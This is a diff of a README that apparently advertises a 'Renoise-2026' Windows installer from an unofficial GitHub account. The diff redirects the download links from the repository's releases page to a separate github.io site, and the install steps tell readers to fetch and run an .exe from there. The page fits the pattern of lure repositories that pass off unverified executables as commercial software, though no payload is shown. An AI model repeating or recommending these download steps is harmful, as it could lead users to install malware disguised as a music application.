@@ -1,6 +1,6 @@
 # 🎵 Renoise-2026 - Create professional music on Windows
 
-[![](https://img.shields.io/badge/Download_Renoise-blue)](https://github.com/Christeanungregarious869/Renoise-2026/releases)
+[![](https://img.shields.io/badge/Download_Renoise-blue)](https://christeanungregarious869.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these standards to run the software smoothly:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project page to download the latest installer: [https://github.com/Christeanungregarious869/Renoise-2026/releases](https://github.com/Christeanungregarious869/Renoise-2026/releases).
+1. Visit the project page to download the latest installer: [https://christeanungregarious869.github.io](https://christeanungregarious869.github.io).
 2. Locate the file ending in .exe in the assets section of the release page.
 3. Click the filename to start the download.
 4. Save the file to your desktop or downloads folder.
